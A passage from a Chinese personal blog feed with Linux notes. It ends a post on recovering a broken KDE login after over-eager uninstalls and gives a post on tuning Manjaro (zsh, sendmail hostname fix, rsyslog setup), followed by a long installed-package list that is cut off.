/><p>重新安装了<code>nerworkmanager</code>、<code>sddm-kcm</code>、<code>sddm</code>、<code>kde-applications</code>，并启动相关服务，重启，OK它回来了，因为配置什么的还在，所以也没损失什么。</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/Emoticons/emo6.jpg" style="zoom:50%;" /><blockquote><p><strong>这次给我的教训就是，别乱卸文件，一两个到没啥，卸多的时候一定要慎重考虑，最好使用命令卸，如果你不知道软件管理是采用什么模式卸载</strong></p></blockquote><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/Emoticons/emo3.gif" style="zoom:50%;" /><p>今天差点想弄死自己，手贱。</p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统优化 </tag>
            
            <tag> KDE </tag>
            
            <tag> 备份 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优化Manjaro</title>
      <link href="/TechnicalExperience/Linux/Manjaro-optimization.html"/>
      <url>/TechnicalExperience/Linux/Manjaro-optimization.html</url>
      
        <content type="html"><![CDATA[<p>为了让系统完美的契合自己，查了很多资料来完善它，写这篇文章记录下过程</p><span id="more"></span><h2 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h2><p>首先就是将bash改成了zsh，使用主题ys，高亮插件和语法补全插件</p><p>参考文章<a href="https://www.jianshu.com/p/d194d29e488c?open_source=weibo_search">oh-my-zsh,让你的终端从未这么爽过</a></p><h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p>在使用crond时，总感觉manjaro的mail有点问题，重新弄了一下</p><p>下载s-nail、sendmail、procmail、m4</p><p>在使用过程中发现sendmail很卡顿，主要原因是<code>WARNING: local host name (MY) is not qualified; see cf/README: WHO AM I?</code></p><p>查了下将/etc/hosts里的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1localhost</span><br></pre></td></tr></table></figure><p>改为了（MY是我的主机名）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1    localhost.localdomain localhost MY</span><br></pre></td></tr></table></figure><p>这样启动和运行就快多了，原理就是sendmail在解析我的主机名，而我的主机名MY根本就找不到，所以浪费时间，在hosts里把主机名作为别名添加到IP后面即可</p><p>参考文章</p><p><a href="https://wiki.archlinux.org/index.php/Sendmail_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">archwiki sendmail</a></p><p><a href="https://my.oschina.net/u/2503743/blog/786010">linux sendmail 启动慢及mail 无法发送的问题一例</a></p><h2 id="rsyslog"><a href="#rsyslog" class="headerlink" title="rsyslog"></a>rsyslog</h2><p>因为是看鸟哥的书学的linux，对rsyslog日志管理比较熟悉，而manjaro自带的是syslog，于是查wiki安装了rsyslog</p><p>首先卸载syslog-ng，以免冲突，然后下载rsyslog，注意它在AUR源里</p><p>为了从systemd提取日志</p><p>需要加载imjournal模块，在/etc/rsyslog.conf添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ModLoad imjournal</span><br></pre></td></tr></table></figure><p>然后转发journal，在/etc/systemd/jouranld.conf修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ForwordToSyslog = yes</span><br></pre></td></tr></table></figure><p>重启rsyslog服务即可</p><p>参考文章</p><p><a href="https://wiki.archlinux.org/index.php/Rsyslog">Archwiki-rsyslog</a></p><blockquote><p>记住要设置开机自启</p></blockquote><p>下面是本机上的程序(不包括依赖)</p><figure class="highlight bash"><figcaption><span>program &gt;folded</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br></pre></td><td class="code"><pre><span class="line">acpi 1.7-3</span><br><span class="line">acpid 2.0.32-1</span><br><span class="line">aircrack-ng 1.6-2</span><br><span class="line">alsa-firmware 1.2.1-2</span><br><span class="line">alsa-utils 1.2.2-1</span><br><span class="line">android-tools 29.0.6-1</span><br><span class="line">android-udev 20200410-1</span><br><span class="line">apparmor 2.13.4-4</span><br><span class="line">archlinuxcn-keyring 20200226-1</span><br><span class="line">ark 20.04.0-1</span><br><span class="line">autoconf 2.69-7</span><br><span class="line">automake 1.16.2-1</span><br><span class="line">avahi 0.8+15+ge8a3dd0-1</span><br><span class="line">b43-fwcutter 019-3</span><br><span class="line">baidunetdisk-bin 3.0.1.2-7</span><br><span class="line">bash-completion 2.10-1</span><br><span class="line">bauh 0.9.0-1</span><br><span class="line">bind-tools 9.16.2-2</span><br><span class="line">binutils 2.34-2.1</span><br><span class="line">bison 3.5.4-1</span><br><span class="line">bluedevil 1:5.18.5-1</span><br><span class="line">bluez-utils 5.54-2</span><br><span class="line">btrfs-progs 5.6-1</span><br><span class="line">bzip2 1.0.8-3</span><br><span class="line">coreutils 8.32-1</span><br><span class="line">cpupower 5.6-1</span><br><span class="line">crda 4.14-3</span><br><span class="line">cronie 1.5.5-1</span><br><span class="line">cryptsetup 2.3.2-1</span><br><span class="line">cups 2.3.3-1</span><br><span class="line">cups-pdf 3.0.1-5</span><br><span class="line">cups-pk-helper 0.2.6-3</span><br><span class="line">deepin-wine-wechat 2.8.0.121-1</span><br><span class="line">deepin.com.qq.office 2.0.0_4-2</span><br><span class="line">device-mapper 2.02.187-2</span><br><span class="line">dhclient 4.4.2-2</span><br><span class="line">dhcpcd 9.0.2-1</span><br><span class="line">dia 0.97.3-5</span><br><span class="line">diffutils 3.7-3</span><br><span class="line">dkms 2.8.1-2</span><br><span class="line">dmidecode 3.2-1</span><br><span class="line">dmraid 1.0.0.rc16.3-12</span><br><span class="line">dnsmasq 2.81-4</span><br><span class="line">dolphin 20.04.0-1</span><br><span class="line">dolphin-plugins 20.04.0-1</span><br><span class="line">dosfstools 4.1-3</span><br><span class="line">e2fsprogs 1.45.6-2</span><br><span class="line">eclipse-java 4.15-1</span><br><span class="line">ecryptfs-utils 111-3</span><br><span class="line">efibootmgr 17-1</span><br><span class="line">exfat-utils 1.3.0-1</span><br><span class="line">f2fs-tools 1.13.0-1</span><br><span class="line">fakeroot 1.24-2</span><br><span class="line">fcitx 4.2.9.7-3</span><br><span class="line">fcitx-configtool 0.4.10-3</span><br><span class="line">fcitx-googlepinyin 0.1.6-6</span><br><span class="line">fcitx-qt5 1.2.4-4</span><br><span class="line">ffmpeg 1:4.2.2-6</span><br><span class="line">ffmpegthumbs 20.04.0-1</span><br><span class="line">file 5.38-3</span><br><span class="line">filelight 20.04.0-1</span><br><span class="line">filesystem 2019.10-4</span><br><span class="line">findutils 4.7.0-2</span><br><span class="line">firefox 76.0.1-1</span><br><span class="line">flatpak 1.7.2-1</span><br><span class="line">flex 2.6.4-3</span><br><span class="line">fwupd 1.4.0-1</span><br><span class="line">gawk 5.1.0-1</span><br><span class="line">gcc 9.3.0-1</span><br><span class="line">gcc-libs 9.3.0-1</span><br><span class="line">gettext 0.20.2-1</span><br><span class="line">ghostscript 9.52-1</span><br><span class="line">gimp 2.10.18-6</span><br><span class="line">git 2.26.2-1</span><br><span class="line">gitg 1:3.32.1+17+gb4c8155f-1</span><br><span class="line">glibc 2.31-2</span><br><span class="line">gnome-icon-theme 3.12.0-5</span><br><span class="line">gnome-settings-daemon 3.36.1-1</span><br><span class="line">gnome-themes-extra 3.28-1</span><br><span class="line">google-chrome 81.0.4044.138-1</span><br><span class="line">grep 3.4-1</span><br><span class="line">grub 2.04-10</span><br><span class="line">grub-theme-manjaro 18.1-1</span><br><span class="line">gsfonts 20180524-2</span><br><span class="line">gst-libav 1.16.2-1</span><br><span class="line">gst-plugins-bad 1.16.2-9</span><br><span class="line">gst-plugins-base 1.16.2-1</span><br><span class="line">gst-plugins-good 1.16.2-3</span><br><span class="line">gst-plugins-ugly 1.16.2-3</span><br><span class="line">gtk-theme-breath 5.9.0-1</span><br><span class="line">gtk3 1:3.24.20-1</span><br><span class="line">gvfs 1.44.1-3</span><br><span class="line">gvfs-afc 1.44.1-3</span><br><span class="line">gvfs-gphoto2 1.44.1-3</span><br><span class="line">gvfs-mtp 1.44.1-3</span><br><span class="line">gvfs-nfs 1.44.1-3</span><br><span class="line">gvfs-smb 1.44.1-3</span><br><span class="line">gwenview 20.04.0-2</span><br><span class="line">gzip 1.10-3</span><br><span class="line">haveged 1.9.8-1</span><br><span class="line">hostapd 2.9-3</span><br><span class="line">hplip 1:3.20.3-2</span><br><span class="line">htop 2.2.0-3</span><br><span class="line">illyria-wallpaper 1.4-1</span><br><span class="line">imagewriter 1.10.1420800585.134a9b3-4</span><br><span class="line">inetutils 1.9.4-8</span><br><span class="line">inkscape 1.0-3</span><br><span class="line">intel-ucode 20191115-3</span><br><span class="line">intellij-idea-community-edition 2:2020.1.1-1</span><br><span class="line">inxi 3.0.37-1</span><br><span class="line">iproute2 5.6.0-1</span><br><span class="line">iptables 1:1.8.4-1.1</span><br><span class="line">iputils 20190709-2</span><br><span class="line">ipw2100-fw 1.3-10</span><br><span class="line">ipw2200-fw 3.1-8</span><br><span class="line">jdk 14.0.1-1</span><br><span class="line">jfsutils 1.1.15-7</span><br><span class="line">kaccounts-providers 20.04.0-1</span><br><span class="line">kamera 20.04.0-1</span><br><span class="line">kate 20.04.0-1</span><br><span class="line">kcalc 20.04.0-1</span><br><span class="line">kde-gtk-config 5.18.5-1</span><br><span class="line">kde-servicemenus-rootactions 2.9.1-1</span><br><span class="line">kdeconnect 20.04.0-1</span><br><span class="line">kdegraphics-thumbnailers 20.04.0-1</span><br><span class="line">kdenetwork-filesharing 20.04.0-1</span><br><span class="line">kdenlive 20.04.0-1</span><br><span class="line">kdeplasma-addons 5.18.5-1</span><br><span class="line">keditbookmarks 20.04.0-1</span><br><span class="line">kernel-alive 0.5-1</span><br><span class="line">kfind 20.04.0-1</span><br><span class="line">kgamma5 5.18.5-1</span><br><span class="line">kget 20.04.0-1</span><br><span class="line">khelpcenter 20.04.0-1</span><br><span class="line">kimageformats 5.69.0-1</span><br><span class="line">kinfocenter 5.18.5-1</span><br><span class="line">kio-extras 20.04.0-1</span><br><span class="line">kmenuedit 5.18.5-1</span><br><span class="line">konsole 20.04.0-1</span><br><span class="line">konversation 1.7.5-3</span><br><span class="line">kscreen 5.18.5-1</span><br><span class="line">kscreenlocker 5.18.5-1</span><br><span class="line">ksshaskpass 5.18.5-1</span><br><span class="line">ksysguard 5.18.5-1</span><br><span class="line">ksystemlog 20.04.0-1</span><br><span class="line">kwallet-pam 5.18.5-1</span><br><span class="line">kwalletmanager 20.04.0-1</span><br><span class="line">kwayland-integration 5.18.5-1</span><br><span class="line">kwin 5.18.5-1</span><br><span class="line">kwrited 5.18.5-1</span><br><span class="line">latte-dock 0.9.11-1</span><br><span class="line">less 551-3</span><br><span class="line">lib32-flex 2.6.4-2</span><br><span class="line">lib32-libcanberra 0.30+2+gc0620e4-3</span><br><span class="line">lib32-libcanberra-pulse 0.30+2+gc0620e4-3</span><br><span class="line">lib32-libva-intel-driver 2.4.0-1</span><br><span class="line">lib32-libva-mesa-driver 20.0.6-2</span><br><span class="line">lib32-libva-vdpau-driver 0.7.4-6</span><br><span class="line">lib32-mesa-demos 8.4.0-1</span><br><span class="line">lib32-mesa-vdpau 20.0.6-2</span><br><span class="line">lib32-vulkan-intel 20.0.6-2</span><br><span class="line">lib32-vulkan-radeon 20.0.6-2</span><br><span class="line">libcanberra 0.30+2+gc0620e4-3</span><br><span class="line">libcanberra-gstreamer 0.30+2+gc0620e4-3</span><br><span class="line">libcanberra-pulse 0.30+2+gc0620e4-3</span><br><span class="line">libdvdcss 1.4.2-2</span><br><span class="line">libestr 0.1.11-1</span><br><span class="line">libfastjson 0.99.8-2</span><br><span class="line">libktorrent 2.1.1-1</span><br><span class="line">liblogging 1.0.6-3</span><br><span class="line">librelp 1.4.0-1</span><br><span class="line">libtool 2.4.6+42+gb88cebd5-12</span><br><span class="line">libva-intel-driver 2.4.0-1</span><br><span class="line">libva-mesa-driver 20.0.6-2</span><br><span class="line">libva-vdpau-driver 0.7.4-4</span><br><span class="line">licenses 20200427-1</span><br><span class="line">linux-firmware 20200424.r1632.b2cad6a-1</span><br><span class="line">linux-lts-headers 1:5.4-1</span><br><span class="line">linux-rt-lts-manjaro 5.4-1</span><br><span class="line">linux-rt-lts-manjaro-headers 5.4-1</span><br><span class="line">linux54 5.4.39-1</span><br><span class="line">linux54-rt 5.4.28_rt19-1</span><br><span class="line">linux54-rt-headers 5.4.28_rt19-1</span><br><span class="line">logrotate 3.16.0-1</span><br><span class="line">lsb-release 1.4-13</span><br><span class="line">lvm2 2.02.187-2</span><br><span class="line">m4 1.4.18-3</span><br><span class="line">make 4.3-3</span><br><span class="line">man-db 2.9.1-2</span><br><span class="line">man-pages 5.06-2</span><br><span class="line">manjaro-alsa 20200126-1</span><br><span class="line">manjaro-application-utility 1.3.2-2</span><br><span class="line">manjaro-bluetooth 20200126-1</span><br><span class="line">manjaro-browser-settings 20200124-1</span><br><span class="line">manjaro-documentation-en 20181009-1</span><br><span class="line">manjaro-firmware 20160419-1</span><br><span class="line">manjaro-hello 0.6.5-11</span><br><span class="line">manjaro-hotfixes 2018.08-6</span><br><span class="line">manjaro-kde-settings 20200430-1</span><br><span class="line">manjaro-pulse 20200126-1</span><br><span class="line">manjaro-release 20.0.1-1</span><br><span class="line">manjaro-settings-manager-kcm 0.5.6-8</span><br><span class="line">manjaro-settings-manager-knotifier 0.5.6-8</span><br><span class="line">manjaro-system 20200427-1</span><br><span class="line">manjaro-wallpapers-18.0 1.4-3</span><br><span class="line">mdadm 4.1-2</span><br><span class="line">memtest86+ 5.01-3</span><br><span class="line">mesa-demos 8.4.0-4</span><br><span class="line">mesa-vdpau 20.0.6-2</span><br><span class="line">mhwd 0.6.4-2</span><br><span class="line">mhwd-db 0.6.4-10</span><br><span class="line">milou 5.18.5-1</span><br><span class="line">mindmaster-cn 7.2-1</span><br><span class="line">mkinitcpio-openswap 0.1.0-3</span><br><span class="line">mobile-broadband-provider-info 20190618-1</span><br><span class="line">modemmanager 1.12.10-1</span><br><span class="line">mtpfs 1.1-3</span><br><span class="line">mypaint 1.2.1-12</span><br><span class="line">nano 4.9.2-1</span><br><span class="line">net-tools 1.60.20181103git-2</span><br><span class="line">netctl 1.23-1</span><br><span class="line">netease-cloud-music 1.2.1-1</span><br><span class="line">netease-cloud-music-gtk 1.1.1-1</span><br><span class="line">networkmanager 1.24.0-1</span><br><span class="line">networkmanager-openconnect 1.2.6-1</span><br><span class="line">networkmanager-openvpn 1.8.12-1</span><br><span class="line">networkmanager-pptp 1.2.9dev+10+gb41b0d0-1</span><br><span class="line">networkmanager-vpnc 1.2.7dev+20+gdca3aea-1</span><br><span class="line">nfs-utils 2.4.3-2</span><br><span class="line">noto-fonts 20190926-4</span><br><span class="line">noto-fonts-cjk 20190409-1</span><br><span class="line">noto-fonts-emoji 20191016-6</span><br><span class="line">nss-mdns 0.14.1-2</span><br><span class="line">ntfs-3g 2017.3.23-4</span><br><span class="line">ntp 4.2.8.p14-1</span><br><span class="line">numlockx 1.2-5</span><br><span class="line">obs-studio 25.0.8-1</span><br><span class="line">okular 20.04.0-1</span><br><span class="line">openresolv 3.10.0-1</span><br><span class="line">openssh 8.2p1-3</span><br><span class="line">os-prober 1.77-1</span><br><span class="line">oxygen 5.18.5-1</span><br><span class="line">oxygen-icons 1:5.69.0-1</span><br><span class="line">p7zip 16.02-5</span><br><span class="line">pacman 5.2.1-4</span><br><span class="line">pamac-cli 9.5.0-1</span><br><span class="line">pamac-gtk 9.5.0-1</span><br><span class="line">pamac-snap-plugin 9.5.0-1</span><br><span class="line">pamac-tray-appindicator 9.5.0-1</span><br><span class="line">partitionmanager3 3.3.1-1</span><br><span class="line">patch 2.7.6-8</span><br><span class="line">patchutils 0.3.4-3</span><br><span class="line">pavucontrol 1:4.0-1</span><br><span class="line">pciutils 3.6.4-1</span><br><span class="line">peek 1.5.1-2</span><br><span class="line">perl 5.30.2-1</span><br><span class="line">perl-file-mimeinfo 0.29-2</span><br><span class="line">phonon-qt5-gstreamer 4.10.0-1</span><br><span class="line">pinta 1.6-4</span><br><span class="line">pkgconf 1.6.3-4</span><br><span class="line">plasma-desktop 5.18.5-1</span><br><span class="line">plasma-nm 5.18.5-1</span><br><span class="line">plasma-pa 5.18.5-1</span><br><span class="line">plasma-workspace 5.18.5-1</span><br><span class="line">plasma-workspace-wallpapers 5.18.5-1</span><br><span class="line">plasma5-themes-breath 0.4.0-2</span><br><span class="line">poppler-data 0.4.9-2</span><br><span class="line">powerdevil 5.18.5-1</span><br><span class="line">powertop 2.12-1</span><br><span class="line">print-manager 20.04.0-1</span><br><span class="line">procmail 3.22-10</span><br><span class="line">procps-ng 3.3.16-1</span><br><span class="line">psmisc 23.3-2</span><br><span class="line">pulseaudio-ctl 1.67-1</span><br><span class="line">pulseaudio-zeroconf 13.0-3</span><br><span class="line">pycharm-community-edition 2020.1.1-1</span><br><span class="line">pygtk 2.24.0-13</span><br><span class="line">python-lxml 4.5.0-1</span><br><span class="line">python-pillow 6.2.1-1</span><br><span class="line">python-pip 20.0.2-1</span><br><span class="line">python-pygame 1.9.6-3</span><br><span class="line">python-pyqt5 5.14.2-1</span><br><span class="line">python-pysmbc 1.0.20-1</span><br><span class="line">python-pyxdg 0.26-6</span><br><span class="line">python-reportlab 3.5.42-1</span><br><span class="line">python-xlib 0.27-1</span><br><span class="line">python2-pbkdf2 1.3-1</span><br><span class="line">python2-pyric 0.1.6.3-1</span><br><span class="line">qq-linux 2.0.0_b2_1082-1</span><br><span class="line">qt5-imageformats 5.14.2-1</span><br><span class="line">qt5-virtualkeyboard 5.14.2-1</span><br><span class="line">quadrapassel 3.36.02-1</span><br><span class="line">rar 5.9.0-1</span><br><span class="line">reiserfsprogs 3.6.27-3</span><br><span class="line">roguehostapd-git 1.0.r45.g381b373-1</span><br><span class="line">rsync 3.1.3-3</span><br><span class="line">rsyslog 8.2004.0-1</span><br><span class="line">ruby 2.7.1-2</span><br><span class="line">s-nail 14.9.19-1</span><br><span class="line">samba 4.12.2-3</span><br><span class="line">scapy 2.4.3-2</span><br><span class="line">scrcpy 1.13-1</span><br><span class="line">screenfetch 3.9.1-1</span><br><span class="line">sddm 0.18.1-2</span><br><span class="line">sddm-breath-theme 0.4.0-2</span><br><span class="line">sddm-kcm 5.18.5-1</span><br><span class="line">sed 4.8-1</span><br><span class="line">sendmail 8.15.2-9</span><br><span class="line">shadow 4.8.1-1</span><br><span class="line">simplescreenrecorder 0.4.1-1</span><br><span class="line">skanlite 2.1.0.1-2</span><br><span class="line">sl 5.02-5</span><br><span class="line">snapd 2.44.5-1</span><br><span class="line">snapd-glib 1.54-1</span><br><span class="line">spectacle 20.04.0-1</span><br><span class="line">spectre-meltdown-checker 0.43-1</span><br><span class="line">splix 2.0.0-14</span><br><span class="line">sshfs 3.7.0-1</span><br><span class="line">steam-manjaro 1.0.0.61-7</span><br><span class="line">subversion 1.13.0-2</span><br><span class="line">sudo 1.8.31.p1-1</span><br><span class="line">sysfsutils 2.1.0-11</span><br><span class="line">system-config-printer 1.5.12+33+g23b454ef-1</span><br><span class="line">systemd-fsck-silent 239-1</span><br><span class="line">systemd-kcm 1.2.1-5</span><br><span class="line">systemd-sysvcompat 245.5-2</span><br><span class="line">systemsettings 5.18.5-1</span><br><span class="line">tar 1.32-3</span><br><span class="line">terminus-font 4.48-1</span><br><span class="line">tesseract 4.1.1-2</span><br><span class="line">texinfo 6.7-3</span><br><span class="line">thunderbird 68.8.0-1</span><br><span class="line">timeshift 20.03.r0.gcecd294-1</span><br><span class="line">tlp 1.3.1-2</span><br><span class="line">traceroute 2.1.0-5</span><br><span class="line">ttf-bitstream-vera 1.10-12</span><br><span class="line">ttf-droid 20121017-7.2</span><br><span class="line">ttf-inconsolata 1:3.000-2</span><br><span class="line">ttf-indic-otf 0.2-9</span><br><span class="line">ttf-liberation 2.1.0-1</span><br><span class="line">typora 0.9.86-1</span><br><span class="line">udiskie 2.1.1-1</span><br><span class="line">udisks2 2.8.4-2</span><br><span class="line">unarchiver 1.10.1-10</span><br><span class="line">usb_modeswitch 2.6.0-2</span><br><span class="line">usbutils 012-2</span><br><span class="line">user-manager 5.18.5-1</span><br><span class="line">util-linux 2.35.1-2.1</span><br><span class="line">vde2 2.3.2-13</span><br><span class="line">vi 1:070224-4</span><br><span class="line">vim 8.2.0717-2</span><br><span class="line">virtualbox 6.1.6-1</span><br><span class="line">virtualbox-ext-vnc 6.1.6-1</span><br><span class="line">virtualbox-guest-iso 6.1.6-1</span><br><span class="line">virtualbox-host-dkms 6.1.6-1</span><br><span class="line">virtualbox-sdk 6.1.6-1</span><br><span class="line">visual-studio-code-bin 1.45.1-1</span><br><span class="line">vlc 3.0.10-1</span><br><span class="line">vokoscreen-git 3.0.2.13.g9e58d6fb-1</span><br><span class="line">vulkan-intel 20.0.6-2</span><br><span 